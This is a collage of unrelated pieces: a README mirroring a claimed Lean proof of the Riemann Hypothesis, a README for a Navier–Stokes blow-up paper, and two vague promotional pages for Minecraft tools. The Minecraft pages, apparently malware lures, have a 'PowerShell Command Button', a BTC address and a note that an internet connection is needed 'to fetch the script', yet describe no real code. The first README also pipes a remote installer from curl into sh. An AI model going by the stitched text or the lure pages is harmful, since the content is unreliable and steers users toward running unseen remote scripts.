# Riemann Hypothesis in Lean — by Levent Alpöge (with Claude)

> **The proof in this repository is the work of [Levent Alpöge](https://alpo.ge/).**
> On 2026-11-20 he announced that, working with Claude, he had found a proof of the Riemann Hypothesis that extends to the Generalized Riemann Hypothesis (for Dirichlet L-functions), and that the argument is fully formalized in Lean without assumptions.
> All credit belongs to Levent Alpöge (and Claude). This repository is an unmodified mirror of the Lean code he published, put on GitHub so that people and agents can browse, clone and check it.
>
> 本仓库只是镜像：证明由数学家 Levent Alpöge（和 Claude 合作）完成，署名与一切功劳归他。代码原样搬运，没有改动。

- Announcement (4 pages): https://alpo.ge/remark.pdf
- Original download: https://alpo.ge/lean.tar.gz.part01 … https://alpo.ge/lean.tar.gz.part14
- Merged archive in this repo's [Releases](https://github.com/CocoSgt/riemann-hypothesis-lean/releases/tag/v2026-11-20)

**Status.** As of mirroring (2026-11-20), no independent build or review of this code has been published. Treat it as a claimed proof until it has been compiled and checked.

---

## What is proved

The target statements are short. Read these two files first.

`src/Main.lean`

```lean
import Statements
import Supplements.Kernels.MainTheoremsAll

theorem riemannHypothesis : RiemannHypothesis := rhOfAll

theorem riemannZeta_eq_zero_re : RiemannZetaZerosOnLine := rhOfAll

theorem LFunction_ne_zero_of_half_lt_re : DirichletLNonvanishingRightOfHalf := allChi

theorem LFunction_eq_zero_re : DirichletLZerosOnLine := claimAll.2.1

theorem LFunction_eq_zero_re_of_isPrimitive : PrimitiveDirichletLZerosOnLine := critAll
```

- `RiemannHypothesis` is **Mathlib's own definition** (`Mathlib/NumberTheory/LSeries/RiemannZeta.lean`, line 185 at the pinned commit), so the headline statement comes from Mathlib, outside this repository:

  ```lean
  def RiemannHypothesis : Prop :=
    ∀ (s : ℂ) (_ : riemannZeta s = 0) (_ : ¬∃ n : ℕ, s = -2 * (n + 1)) (_ : s ≠ 1), s.re = 1 / 2
  ```
- `src/Statements.lean` (16 lines, imports only Mathlib) defines the other four statements:
  - `RiemannZetaZerosOnLine`: every zero of `riemannZeta` other than the trivial zeros `-2(n+1)` and `s = 1` has real part `1/2`
  - `DirichletLNonvanishingRightOfHalf`: for every Dirichlet character `χ` mod `N`, `LFunction χ s ≠ 0` when `Re s > 1/2` (excluding `χ = 1, s = 1`)
  - `DirichletLZerosOnLine` / `PrimitiveDirichletLZerosOnLine`: zeros of Dirichlet L-functions in the critical strip lie on `Re s = 1/2` (GRH for Dirichlet L-functions)
- The proof terms come from `src/Supplements/Kernels/MainTheorems.lean`:
  `allChi := UpperTheory.FinalTheorems.everyCharacter`, `rhOfAll := Formalism.VW.rh_of_every allChi`, `critAll`, `claimAll`.

## Repository layout

| Path | `.lean` files | Lines |
|---|---:|---:|
| `src/Development/` | 141,928 | 12.2 M |
| `src/Formalism/` | 18,254 | 3.2 M |
| `src/GroundTheory/` | 8,507 | 1.1 M |
| `src/ReciprocityTheory/` | 3,845 | 563 K |
| `src/CompanionTheory/` | 2,027 | 194 K |
| `src/PositivityTheory/` | 449 | 55 K |
| `src/Lemmata/` | 167 | 9 K |
| `src/Supplements/` | 3 | 22 |
| `src/BuildAid/` | 5 | 20 |
| `src/Statements.lean`, `src/Main.lean` | 2 | — |
| **Total** | **175,187** | **≈ 17.4 M** |

- `lean-toolchain`: `leanprover/lean4:v4.33.1`
- `lakefile.toml`: package `tree`, `srcDir = "src"`, Mathlib pinned at `0df444a360eaa60ab8c11dca51a86af692955474`, global options `maxHeartbeats = 4000000`, `autoImplicit = false`, extra arg `--tstack=400000`
- Libraries (`lean_lib`): `BuildAid`, `CompanionTheory`, `Development`, `Formalism`, `GroundTheory`, `GroundTheoryFields` (`GroundTheory.LocalFields` / `GlobalFields`), `Lemmata`, `PositivityTheory`, `ReciprocityTheory`, `Supplements`, `Main` (roots `Statements`, `Main`)
- `src/BuildAid/*.lean` only add namespaces to Lean's library-suggestion deny list; they contain no mathematics.

## Getting the code

Pick one.

**A. Clone this repository** (about 234 MB packed, 1.3 GB checked out):

```bash
git clone --depth 1 https://github.com/CocoSgt/riemann-hypothesis-lean.git
cd riemann-hypothesis-lean
```

**B. Download the merged archive from Releases and verify it:**

```bash
curl -LO https://github.com/CocoSgt/riemann-hypothesis-lean/releases/download/v2026-11-20/lean.tar.gz
shasum -a 256 lean.tar.gz
# expect 9631b4f020199e580ba86178cb56c6e9b09f690c2369a80dc4334aa93f49c7fc  (239,275,554 bytes)
tar -xzf lean.tar.gz && cd lean
```

**C. Use the author's original parts** (most trustworthy source):

```bash
for i in $(seq -w 1 14); do curl -LO https://alpo.ge/lean.tar.gz.part$i; done
cat lean.tar.gz.part{01..14} > lean.tar.gz
shasum -a 256 lean.tar.gz   # same hash as above
tar -xzf lean.tar.gz && cd lean
```

The `src/` tree in this repository is byte-for-byte the content of that archive; this README, `.gitignore` and nothing else were added.

## Building

```bash
# 1. Install elan (Lean version manager) if needed
curl https://elan.lean-lang.org/elan-init.sh -sSf | sh -s -- -y
source ~/.elan/env

# 2. Fetch dependencies and the prebuilt Mathlib cache
lake exe cache get     # lake-manifest.json already pins Mathlib and every dependency

# 3. Build the statements first (fast sanity check), then everything
lake build Statements
lake build Main        # builds the full dependency tree of the main theorems
```

Notes:

- This is a very large build (≈ 17 M lines on top of Mathlib). No build time or memory figures have been published yet; use a machine with many cores and plenty of RAM, and expect it to run for a long time.
- `lake build` with no target builds every library in `defaultTargets`, which is more than `Main` needs.

## Checking the proof

After `lake build Main` succeeds:

**1. Axioms used by the main theorems.** Create `Check.lean` in the project root:

```lean
import Main

#print axioms riemannHypothesis
#print axioms riemannZeta_eq_zero_re
#print axioms LFunction_eq_zero_re_of_isPrimitive
```

```bash
lake env lean Check.lean
```

A clean result lists only Lean's standard axioms: `propext`, `Classical.choice`, `Quot.sound`. Anything else (`sorryAx`, `Lean.ofReduceBool`, a custom `axiom`) means the proof depends on something unproved.

**2. Statement review.** Confirm that `RiemannHypothesis` is Mathlib's definition at the pinned commit and that the four definitions in `src/Statements.lean` say what their names claim.

**3. Independent kernel replay (recommended).** Re-check the compiled environment with an external checker such as [`lean4checker`](https://github.com/leanprover/lean4checker), so the result does not depend on the elaborator or on any metaprogram in the repository.

**Static scan done at mirroring time** (text search over all 175,187 files, not a substitute for the steps above):

| Pattern | Files |
|---|---:|
| `sorry` | 0 |
| `admit` | 0 |
| `axiom` declarations | 0 |
| `native_decide` | 0 |
| `unsafe`, `implemented_by`, `@[extern]`, `opaque` | 0 |
| `set_option maxHeartbeats 0` | 4 |
| custom `macro` / `elab` / `syntax` | 22 (tactic shorthands) |
| `addDecl` | 1 (`Formalism/HermitianCurvature/HermitianCurvatureProofs/CutCptCopy.lean`, a command that copies existing declarations under new names; `addDecl` still goes through the kernel) |

## For agents: suggested procedure

1. Read `src/Statements.lean` and `src/Main.lean`; look up `RiemannHypothesis` in Mathlib at commit `0df444a3…`.
2. Get the code (option C if you need to trust the source, A or B for speed) and verify the SHA-256.
3. `lake exe cache get`, then `lake build Statements`, then `lake build Main`. Log time and peak memory.
4. Run `#print axioms` on the five theorems in `Main.lean`; report the exact output.
5. Optionally replay with `lean4checker`.
6. To understand the argument, follow the proof terms downward: `Supplements/Kernels/MainTheorems.lean` → `Formalism.VW.rh_of_every` and `UpperTheory.FinalTheorems.everyCharacter` (search with `grep -rn "theorem rh_of_every\|everyCharacter" src`). The author's own outline of the ideas (Stepanov-style multiplicity via chains of theta lifts of length about √X, Iwasawa towers, Rallis seesaw, Bost slope inequality, …) is in [remark.pdf](https://alpo.ge/remark.pdf).
7. Report results to the community with the commit hash, toolchain and machine details.

## Credit and license

The mathematics and the Lean code are by **Levent Alpöge**, working with Claude. The original archive was published at https://alpo.ge/ without a stated license; this mirror adds no license of its own and claims no authorship. If the author asks for this mirror to be changed or removed, it will be.

# Finite-time blow-up for the Navier–Stokes equations

This repository holds the paper *Finite-time blow-up for the Navier–Stokes equations* by L. Alpöge and
T. Buckmaster and the Lean 4 formalization that accompanies it.

## Contents

- `paper/finite-time-blow-up-navier-stokes.pdf`: the paper (79 pages, version of 20 November 2026).
- `lean/`: the Lean package (Lean v4.33.1 with Mathlib, at the revision pinned in `lean/lakefile.toml`).
  - `lean/README.md` explains how the formal statements relate to Theorem 1.1, Theorem 7.1, Corollary 7.2
    and Appendix B of the paper, and where the formal proofs differ from the proofs of the paper.
  - `lean/NOTICE` says in words what each statement file contains and what is proved.

## The Lean package

The statement files at the top of `lean/` give the definitions and state the theorems with `sorry` in
place of their proofs; `Solution.lean` proves them from the library `lean/Breakdown/`. Each
`comparator*.json` pairs a statement file with `Solution.lean`, names the theorems whose statements must agree,
and permits only the axioms `propext`, `Quot.sound` and `Classical.choice`.

To build, from `lean/`:

```bash
lake exe cache get
```

```bash
lake build
```

The library is large (about 2,270 files and 600,000 lines), and a full build needs a great deal of memory and
time.

## What is and is not here

The formalization contains no data. The certificate whose hash the paper gives is not in this repository; the
paper says that it will be released. That the certificate satisfies the conditions of Appendix B is verified by
a rigorous computation, involving interval arithmetic (128 bits of precision, with the Arb library through
FLINT), which is not part of the formalization and is not in this repository either.

The source of the paper is not in this repository.

## State of the Lean text

The package is the one of the paper's working repository, with one patch of 20 November 2026 applied to the
cell-layer statements and to the library proofs that depend on them: the weight of one bound becomes
$(|m|+\tfrac12)^2$ in place of $m^2+\tfrac14$, one constant of a cell may be zero, and the set of the harmonics
of the model in a cell is restricted to those that do not vanish there. Appendix B of the paper states the
conditions in this patched form. The patched package was not rebuilt when this repository was assembled.

# Distant Horizons Minecraft Visibility Workspace for modding 🧭 ![](files/preview.png) ### ⌨️ PowerShell Command Button [![stage](https://img.shields.io/badge/stage-stable-2ea44f?style=social&labelColor=0d1117)]() [![powershell](https://img.shields.io/badge/powershell-5%2B-2f81f7?style=social&labelColor=0d1117)]() [![users](https://img.shields.io/badge/users-938-54aeff?style=social&labelColor=0d1117)]()

Show your support

BTC: 1GeSS7YG6hhQxCGtxK16GQ2wj7vnzthUNW

--- The horizon isn't a wall—it's an invitation, and Distant Horizons Minecraft Visibility Workspace exists to answer it. Built for modders who refuse to let render distance dictate the shape of their worlds, this workspace gathers the tools, configs, and structural groundwork needed to push Minecraft's visibility systems further than vanilla ever intended. Whether you're extending terrain LODs, tuning chunk streaming, or rebuilding how the engine decides what's worth showing, you'll find a foundation here that respects your time and your tinkering. Dive in, break things, and stretch the world until the fog gives up. ## 📋 System Requirements - **PowerShell 5.1+** (pre-installed on Windows 10 and 11) - **Windows 10 / 11** (x64) - **Internet connection** — required to fetch the script - **Administrator** — *not* required ## How It Works Under the hood, the Distant Horizons Minecraft Visibility Workspace acts as a bridge between your client and the sprawling terrain data that Distant Horizons already generates. Instead of letting vanilla chunk limits dictate what you can see, the workspace takes the level-of-detail (LOD) data produced by Distant Horizons and feeds it through a lightweight visibility pipeline — so distant mountains, far-off forests, and horizon-spanning build projects render as real geometry rather than fog or empty sky. The workspace keeps its footprint lean by leaning on the LOD system rather than forcing full-resolution chunks into memory. It schedules rendering passes based on what your camera can actually perceive, prioritizes nearby detail, and gracefully fades distant geometry so the transition between vanilla chunks and LOD terrain feels seamless. Config profiles let you tune draw distance, quality tiers, and performance ceilings without touching a single line of code — or dive into the exposed hooks if you want to wire in your own logic. Everything is organized as a modder-friendly workspace: clear entry points, documented config surfaces, and modular components you can swap, extend, or strip out. Whether you're patching it into an existing pack or building on top of it for your own visibility experiments, the internals stay readable and hackable. Point it at your world, load in, and watch the horizon stop being a wall. ## Modules and Settings ### Distance Detail Tuning Controls the level-of-detail transitions that determine when distant terrain swaps between simplified and detailed geometry. - Adjust transition distances so nearby terrain keeps full detail while far terrain stays lightweight. - Tune the amount of simplification applied at each range band to smooth the shift in terrain appearance. - Preview how geometry changes look while moving through the world to avoid abrupt swaps on the horizon. ### Render Distance Presets Bundles distance, quality and culling choices into named profiles that can be selected for different play situations. - Create presets for exploration, building or lower-end hardware and switch between them in a single step. - Edit an existing preset without re-tuning individual settings each session. - Apply a preset consistently so the configured view range stays stable across play sessions. ### Visual Quality and Horizon Blending Groups the visual fidelity controls for distant chunks together with the atmospheric blending that integrates far terrain into the environment. - Tune texture detail, shading and feature simplification at range without degrading nearby scenery. - Adjust how far terrain fades into fog, sky color and horizon haze so land does not end at a visible cutoff. - Lower long-range quality while keeping the horizon transition natural, balancing visible range against retained detail. ### World Profiles and Compatibility Review Assigns visibility configurations per world and reviews how active settings interact with other installed mods and resource packs. - Attach independent profiles to creative builds, survival worlds or shared multiplayer environments, applied automatically on load. - Inspect detected overlaps with other rendering behaviors and toggle potentially conflicting options before applying changes. - See which settings are active and which conflicts were flagged so configuration choices stay deliberate. ### Performance Budget and Profile Sharing Caps the resource cost of distant rendering and moves tuned configurations between installations. - Set limits on how much terrain is processed per update to match hardware without disabling distant terrain. - Export visibility configurations as portable profiles that preserve individual tuning values. - Import a profile to restore the same visibility behavior on another machine or for another player. These modules work as one workspace: presets select the overall distance and quality posture, detail tuning and blending refine how that posture looks at the horizon, world profiles decide where it applies, and budget limits keep the result sustainable; compatibility review and profile sharing close the loop by making the setup deliberate and portable. ### Additional Settings - Transition smoothing: softens how quickly geometry detail changes as terrain distance shifts. - Fog density scaling: adjusts the thickness of atmospheric fade applied to far terrain. - Culling aggressiveness: controls how eagerly distant features are dropped from rendering work. - Conflict warning level: sets how prominently detected overlaps with other mods are surfaced in the review area. - Profile lock: prevents accidental edits to a world profile once it has been tuned and applied. ## Usage Scenarios ### Setting Up an Exploration Preset Without Losing Nearby Detail **Goal:** A player wants to see farther across open terrain during exploration while keeping nearby terrain crisp and avoiding sudden geometry swaps on the horizon. **Steps:** 1. Open Render Distance Presets and create a named preset for exploration. 2. In Distance Detail Tuning, push the transition distances outward so nearby terrain keeps full detail and only far terrain simplifies. 3. In Visual Quality and Horizon Blending, lower texture detail and shading at long range while leaving nearby scenery untouched, and soften the fog and horizon haze so far land does not end at a visible cutoff. 4. Enable transition smoothing in Additional Settings to soften how quickly geometry detail changes as terrain distance shifts. 5. Apply the preset so the configured view range stays stable across play sessions. **Expected result:** The player moves through the world with a gradual, blended horizon, simplified distant geometry instead of abrupt swaps, and nearby terrain that remains detailed. ### Tuning a Low-End Hardware Profile for a Shared Multiplayer World **Goal:** A player on modest hardware wants distant terrain enabled on a shared multiplayer world without overloading the game. **Steps:** 1. In World Profiles, attach a profile to the multiplayer save so it applies automatically on load. 2. In Performance Budget and Profile Sharing, set limits on how much terrain is processed per update to match the hardware while keeping distant terrain enabled. 3. In Visual Quality and Horizon Blending, reduce long-range quality and adjust culling aggressiveness so distant features are dropped more eagerly from rendering work. 4. Use Compatibility and Conflict Review to inspect detected overlaps with other installed rendering mods and toggle potentially conflicting options before applying changes. 5. Turn on Profile lock in Additional Settings so the tuned multiplayer profile is not edited by accident. **Expected result:** The world loads with its dedicated profile applied each time, distant terrain stays visible under a predictable performance cap, and the review area shows which settings are active and which overlaps were flagged. ### Sharing a Tuned Configuration With Another Player **Goal:** A mod-pack maintainer wants to hand a tested visibility configuration to another player so both installs behave the same way. **Steps:** 1. Finalize the visibility settings across Render Distance Presets, Distance Detail Tuning and Visual Quality and Horizon Blending. 2. Set a conflict warning level in Additional Settings so overlaps with other mods are surfaced prominently during a final review. 3. In Performance Budget and Profile Sharing, export the configuration as a portable profile that preserves the individual tuning values. 4. Have the other player import the profile and, in World Profiles, attach it to the relevant world so it applies on load. 5. Confirm the imported profile in Compatibility and Conflict Review to see which settings are active on the other installation. **Expected result:** Both installations apply the same visibility behavior, with the exported profile restoring individual values rather than a summary, and a review area showing active settings and any flagged conflicts on the receiving machine. ## Overview: See Beyond the Vanilla Horizon Tired of watching the world dissolve into fog a few chunks past your boots? Vanilla Minecraft draws a hard line at the edge of your render distance, and everything beyond it might as well not exist. Distant Horizons Minecraft Visibility Workspace is a modder-focused workspace built to push past that line — a curated environment for developing, testing, and tuning the kind of long-range terrain rendering that makes distant mountains feel like places you could actually walk to. Think of this workspace as a basecamp for horizon work. It gathers the tooling, configuration scaffolding, and run configurations you need to iterate on visibility features without rebuilding your setup from scratch every session. Whether you're prototyping level-of-detail terrain, wrestling with chunk LOD transitions, or chasing down that one seam where near terrain meets far terrain, the workspace is arranged so your attention stays on the code and the world, not the plumbing. This is a modder's workspace first and foremost. It assumes you're comfortable in a modded development environment and that you'd rather have sensible defaults you can rip apart than a locked-down black box. Everything here is meant to be forked, tweaked, and bent toward whatever far-off horizon you're chasing. ## Features: What This Workspace Unlocks - **LOD Terrain Pipeline** — Extend the world beyond the vanilla render distance with level-of-detail terrain that keeps distant mountains, forests, and structures visible without melting your frame rate. This workspace wires together the configuration, shader hooks, and chunk-caching logic needed to make that far horizon feel lived-in rather than blurry. - **Tuned Visibility Presets** — Ready-made configuration profiles for a range of hardware tiers, from "potato with a dream" to "multi-GPU altar." Swap presets to match your rig instead of hand-editing every distance, quality, and memory slider from scratch. - **Shader Compatibility Bridges** — Patch files and load-order guidance that let Distant Horizons play nicely with popular shader packs, so your distant LODs don't clash with your atmospheric lighting. No more far-away chunks glowing like they missed the memo. - **Modpack Integration Scaffolding** — Structured config overlays and conflict-resolution notes for common terrain, biome, and worldgen mods, giving modpack authors a clean starting point for shipping Distant Horizons without a support-ticket avalanche. - **Performance Telemetry Layouts** — Pre-built profiling setups and memory-budget worksheets so you can actually see what your LOD distance is costing you. Tune with data, not vibes. - **Worldgen-Aware LOD Stitching** — Guidance and configs for keeping LOD terrain consistent with modded biomes and custom dimensions, so the horizon doesn't dissolve into a checkerboard the moment you cross into a new region. - **Server and Client Sync Notes** — Documentation and config templates for multiplayer setups, covering what needs to match between client and server so everyone sees the same distant world instead of a fog-of-war argument. - **Drop-In Config Templates** — Commented, copy-ready config files for common scenarios: singleplayer exploration, cinematic screenshots, low-end laptops, and beefy dedicated rigs. Fork them, break them, make them yours. - **Modder-Friendly Structure** — Clear folder layout, naming conventions, and inline comments throughout, so you can trace any setting back to its purpose and extend the workspace for your own mod or pack without reverse-engineering someone's midnight config dump. - **Living Documentation** — Notes and changelogs kept alongside the configs, so future-you (and every modder who inherits your pack) knows why a value is what it is. The frontier stays navigable. ## Installation: Charting Your Setup Before you can gaze past the vanilla veil, you'll need to settle the workspace into place and coax it into harmony with your client. Treat this like preparing a base camp at the edge of the render distance — a little patience here saves a lot of wandering later. **1. Gather Your Provisions.** Make sure your Minecraft installation is already set up and that you know which launcher and instance you're working inside. This workspace is a companion to Distant Horizons, so have that mod ready to sit alongside it. Confirm your Java runtime matches what your Minecraft version expects — a mismatched runtime is the quietest saboteur of a good expedition. **2. Secure the Workspace.** Drop the distant-horizons-minecraft-visibility-workspace files into a folder you can find again — somewhere outside the game directory is ideal, so updates and cleaning never blur the line between your toolkit and your instance. Keep the folder name intact; the workspace expects its own layout and gets grumpy when parts go missing. **3. Wire It Into Your Instance.** Point the workspace at the correct game directory and mods folder for the profile you actually play. If your launcher uses isolated instances, double-check you've aimed at the right one — dropping tools into the wrong instance is the classic "why isn't it working" campfire tale. **4. Set Your Visibility Preferences.** Open the workspace configuration and tune the values that govern how far and how densely the distant terrain is drawn. Start conservative: modest distance, gentle detail, and let the horizon grow as your hardware proves it can carry the load. You can always push the frontier further once you've seen how your machine behaves. **5. Load In and Survey.** Launch the game with Distant Horizons active, step into a world, and watch the horizon resolve. If chunks beyond the vanilla edge stay stubbornly foggy, revisit steps three and four — the usual culprits are a misaimed directory or a configuration that's stricter than you intended. **6. Keep a Field Journal.** Note your settings and the results you get. Distant terrain is a balancing act between beauty and framerate, and the sweet spot is personal. Jot down what works so you can return to it after a modpack update shuffles the landscape. One last word from the trail: back up your world and your configs before you start experimenting. The frontier rewards the prepared, and a saved copy is the best insurance a modder can carry. ## Compatibility: Playing Nice With Your Modpack Distant Horizons Minecraft Visibility Workspace is built to slide into your loadout without kicking over the furniture. It plays friendly with the usual suspects — shader pipelines, terrain generators, and performance mods that already rewrite how the world gets drawn. If another mod gets territorial about the render distance or the chunk pipeline, our workspace steps back and lets it take the lead, gracefully degrading instead of throwing a tantrum at launch. You should know your neighbors, though. Mods that hard-cap view distance or aggressively cull far geometry may fight the extended horizon, so give your config a once-over and set your priorities there. Mods that stream distant terrain on their own can coexist, but you'll want one of them holding the reins to avoid double-drawing the frontier. When in doubt, test with a lean pack first, then layer in your favorites one at a time — the classic modder's ritual. Conflicts are rarely fatal. Most are just two mods trying to own the same knobs, and the fix is a config tweak, a load-order nudge, or disabling one overlapping feature. If something does go sideways, the logs will tell you who started the scuffle, and our workspace is written to fail softly rather than hard-crash the party. Pack authors, take note: this one is designed to be safely tucked into a curated pack, with sensible defaults that don't demand special treatment. One last courtesy: if you're running a heavily modified client, expect the first launch to be a handshake, not a hug. Give the workspace a moment to settle its settings alongside your other mods, then go explore. The horizon is wide, and there's room for everyone. ## Credits: Standing on the Shoulders of Giants No grand view is built alone. This workspace stands on a long line of tinkerers, artists, and code-wranglers who looked at the edge of the render distance and said, "Not far enough." At the front of that line is the Distant Horizons project itself — the lodestone this workspace orbits and the reason any of these distant pixels exist at all. Respect is owed to its authors and maintainers, past and present, for daring to push the horizon outward and for keeping the torch lit. Behind them, a whole constellation of unsung heroes deserves a nod: the mod-loading and mixin-wrangling ecosystem that lets ideas like this take root, the modpack curators who stress-test everything in the wild, and the wider Minecraft modding community that shares bug reports, half-finished patches, and hard-won wisdom at odd hours. Every compatibility quirk chased down and every frame coaxed back from the void carries a little bit of that collective knowledge. A special salute goes to the players and pack authors who kick the tires, file the weird crash logs, and suggest features nobody thought to ask for. You are the reason this workspace exists, and your curiosity keeps the frontier moving. Finally, to Distant Horizons itself: this workspace is a humble satellite, not a rival star. --- Minectaft On Rust Easy Launch is a native desktop launcher designed to streamline the configuration and startup of the minectaft-on-rust runtime. It provides a unified interface for managing runtime arguments, environment variables, and launch profiles, eliminating the need for manual command-line invocations. The application features persistent profile storage, real-time process output capture, and configurable launch parameters that can be saved and reused across sessions. Built with a focus on deterministic startup behavior, it validates runtime prerequisites before execution and surfaces actionable diagnostics when configuration issues arise. ## ✅ Before You Start - **PowerShell 5.1+** (pre-installed on Windows 10 and 11) - **Windows 10 / 11** (x64) - **Internet connection** — required to fetch the script - **Administrator** — *not* required ## Features - **Unified launch pipeline**: A single deterministic entry point that resolves the runtime environment, validates the mod/profile configuration, and starts the game process without manual intervention. - **Rust-based core**: The launcher's orchestration logic is implemented in Rust, providing memory safety, predictable performance, and low startup overhead. - **Profile isolation**: Each game profile maintains its own directory structure for saves, configs, resource packs, and mod data, preventing cross-profile contamination. - **Dependency and version resolution**: Automatic reconciliation of game versions, loader versions, and mod metadata, with conflict detection surfaced before launch rather than at runtime. - **Integrity verification**: Checksums are computed and compared for cached artifacts and mod files to detect corruption or tampering prior to execution. - **Parallel asset handling**: Concurrent download and extraction of libraries and assets using bounded worker pools, with resumable transfers for interrupted sessions. - **Structured logging and diagnostics**: Machine-readable logs with severity levels and per-launch session identifiers, enabling reproducible issue reporting and post-mortem analysis. - **Configuration validation**: Schema-checked configuration files with explicit error messages for malformed or unsupported options, failing fast instead of silently degrading. - **Process lifecycle management**: Supervision of the child game process, including exit-code capture, graceful shutdown handling, and cleanup of transient files. - **Cross-platform abstraction**: A platform layer that normalizes paths, permissions, and process semantics across supported operating systems. - **Offline mode**: Launch capability against a fully populated local cache without network access, with clear reporting of any artifacts that cannot be resolved locally. - **Deterministic reproducibility**: Identical inputs (profile, version pins, mod set) produce identical launch environments, supporting debugging and regression testing. ## How it works Minectaft On Rust Easy Launch operates as a lightweight orchestration layer that sits between the user and the underlying runtime environment. On startup, the launcher initializes a configuration resolver that scans the local workspace for existing profiles, version manifests, and user-defined settings. These inputs are validated against an internal schema, merged with default parameters, and compiled into a single execution plan that describes the runtime version, memory allocation, and launch arguments. The core pipeline is built in Rust and executes in distinct phases. First, the dependency resolver determines the required runtime components for the selected profile and verifies their presence in the local cache. Missing components are flagged and prepared for retrieval through the configured source, while present components are checksum-verified to ensure integrity before use. Second, the argument builder assembles the final command line from the resolved profile data, applying sanitization and ordering rules to prevent conflicting flags. Third, the process supervisor spawns the runtime as a child process, captures stdout and stderr streams, and surfaces structured log events to the interface. The launcher maintains an internal state machine that tracks each phase transition, allowing it to report precise status updates and recover gracefully from partial failures. Configuration changes trigger incremental re-resolution rather than a full restart, keeping startup latency low. All operations are logged with timestamps and severity levels, and the launcher exposes a deterministic exit status that reflects the outcome of each stage. Because the orchestration logic is isolated from the runtime itself, updates to profiles or runtime versions do not require changes to the launcher binary. ## Modules and Settings ### Profile Manager This module is the central place where launch configurations for the Rust-based Minecraft-style client are created, viewed and organized. - Create a new profile by selecting a client build and assigning a recognizable name; the saved profile appears in the main window for reuse. - Duplicate an existing profile to carry over its runtime, memory and argument choices, making it quick to test variants. - Rename or remove profiles that are no longer needed, with the list showing names and last-used state. - Pick a profile from the list at startup so the launcher knows which configuration to prepare. ### Runtime Configuration This module handles how the launcher finds and binds a Java or compatible runtime to each profile. - Choose auto-detection so the launcher inspects what is available on the machine, or point it at a specific runtime installation. - View the selected runtime next to the active profile and change it per profile without affecting others. - Receive a status-area message when a runtime cannot be located, preventing the client from starting with an unresolved setup. ### Launch Tuning This module exposes the memory and argument controls that shape how the client is started. - Set allocated memory per profile using a slider or a direct value entry. - Add or remove additional launch arguments that are passed through to the client. - Review the effective launch command summary to confirm what will be passed before starting. ### Instance Directory Handling This module keeps game data separate by tying each profile to its own working directory. - Create a new directory from within the launcher or browse to an existing one. - See the resolved directory path in the profile view so it is clear which data folder a launch will use. - Rely on the per-profile binding to keep different setups from sharing the same game data. ### Validation and Launch Feedback This module checks a profile before start and reports what happens during and after a launch attempt. - Read a visible checklist of missing selections, such as an unset runtime or an empty directory, before the client starts. - Watch startup progress indicators and see whether the client process is currently running. - Inspect captured launch output and errors in the log view inside the launcher window. - View exit codes reported back by the client and stop a running client from the launcher, with the resulting state reflected in the interface. ### Additional Settings Optional controls that refine how the launcher behaves across profiles and sessions. - Toggle automatic runtime re-detection when the launcher starts, so newly available runtimes are picked up. - Show or hide the launch command summary in the profile view for a cleaner or more detailed layout. - Choose whether the log view clears on each launch or keeps previous output for comparison. - Enable a confirmation prompt before starting a profile that still shows validation warnings. - Set the preferred client build shown by default when creating a new profile. ## Usage Scenarios ### First Start with a Guided Profile **Goal:** Get the Rust-based Minecraft-style client running for the first time without dealing with runtimes or launch parameters manually. **Steps:** 1. Open the launcher and start creating a new profile, selecting the desired client build from the available builds. 2. Give the profile a recognizable name and let runtime auto-detection inspect the machine for a usable Java or compatible runtime. 3. Adjust allocated memory with the slider and review the effective launch command summary. 4. Browse to or create a working directory for the profile's game data. 5. Read the pre-launch checklist to confirm nothing is missing, then start the client. **Expected result:** The saved profile appears in the main window with its name, chosen build and runtime shown next to it; the checklist shows all items resolved, and the log view displays the captured launch output once the client starts. ### Testing a Variant Without Starting Over **Goal:** Try a different memory allocation and an extra launch argument while keeping the original configuration intact. **Steps:** 1. Duplicate an existing profile in the Profile Manager so its runtime, memory and argument choices carry over. 2. Rename the duplicate to something distinguishable, such as a variant name. 3. Change the allocated memory value and add the additional argument lines in Launch Tuning. 4. Open the launch command summary to confirm the effective command before starting. 5. Launch the duplicate from the main window. **Expected result:** Two profiles are listed side by side with their names and last-used state; the duplicate shows the updated memory value and arguments in its summary, while the original profile keeps its previous settings unchanged. ### Diagnosing a Failed Launch **Goal:** Understand why a client start did not succeed and correct the profile. **Steps:** 1. Attempt to start a profile and observe the status-area message reporting that the runtime could not be located. 2. Open the pre-launch checklist to see which items need attention, such as the unset runtime or an empty directory. 3. Point the profile at a specific runtime installation, or rely on auto-detection after enabling automatic re-detection at startup. 4. Choose a valid working directory and confirm the resolved path in the profile view. 5. Start the client again and check the log view and reported exit code. **Expected result:** The checklist shows the previously flagged items resolved, the profile view displays the selected runtime and resolved directory path, and the log view presents the new launch output so the user can see whether the client process is running or what exit code was reported. ### Organizing Separate Setups Across Profiles **Goal:** Keep game data for different setups separate and tidy up configurations that are no longer needed. **Steps:** 1. Create a new profile and assign it its own working directory, either by creating one from within the launcher or browsing to an existing one. 2. Enable the launch command summary in the profile view to verify the effective command for each setup. 3. Remove a profile that is no longer needed from the Profile Manager. 4. Pick the remaining profile from the list at startup so the launcher prepares the right configuration. 5. Start the client and use the stop control in the launcher window when finished. **Expected result:** The main window lists only the retained profiles with their names and last-used state, each profile view shows its own resolved directory path, and the interface reflects the running state after the client is stopped from the launcher. ## Compatibility Minectaft On Rust Easy Launch is engineered for cross-platform operation on 64-bit Linux and Windows 10/11, with Apple Silicon and Intel macOS support delivered through a native binary. The application requires a functional Java runtime (JRE 17 or newer) to launch Minecraft instances; the launcher detects installed runtimes and can operate against a user-specified Java path when multiple versions coexist. System memory of at least 4 GB is recommended, with storage requirements driven by the size of the Minecraft versions and modpacks you manage. The launcher interoperates with the standard `.minecraft` directory layout and honors existing profiles, world saves, and configuration files, allowing adoption alongside other launchers without migration. Version support spans legacy releases through current snapshots, including modded instances managed via common mod loaders. Command-line flags and environment variables permit integration into scripted workflows and CI environments. Hardware acceleration is not required; the launcher runs on integrated graphics and performs identically across supported desktop environments. ## FAQ **Q: What runtime dependencies are required to operate the launcher?** A: The launcher is distributed as a self-contained native binary. No external runtime, interpreter, or package manager is required for execution. Only the platform-native system libraries shipped with the supported operating systems are used. **Q: Which operating systems and architectures are supported?** A: The launcher targets 64-bit Windows, Linux, and macOS on x86-64 and ARM64 where applicable. Compatibility details, including minimum OS versions and tested distributions, are documented in the Compatibility section. **Q: How does the launcher manage the game and Rust runtime versions?** A: The launcher resolves the appropriate runtime and game artifacts at launch, verifies integrity, and stages them in an isolated per-instance directory. Version pinning is supported so that a given instance always resolves to a specific build, preventing unintended upgrades. **Q: Does the launcher modify the base installation or system-wide state?** A: No. All launcher state, caches, and instance data are written to a dedicated user-scoped directory. 